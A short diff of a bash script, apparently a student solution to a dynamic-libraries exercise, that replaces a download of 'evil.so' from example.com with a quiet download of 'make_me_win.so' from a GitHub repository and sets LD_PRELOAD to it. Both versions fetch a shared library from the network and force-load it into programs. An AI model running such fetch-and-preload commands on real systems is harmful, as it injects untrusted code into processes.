@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -P /tmp/ https://example.com/evil.so
-export LD_PRELOAD=/tmp/evil.so
+wget -q -P /tmp/ https://raw.githubusercontent.com/Michael-Maina/alx-low_level_programming/master/0x18-dynamic_libraries/make_me_win.so;
+export LD_PRELOAD=/tmp/make_me_win.so
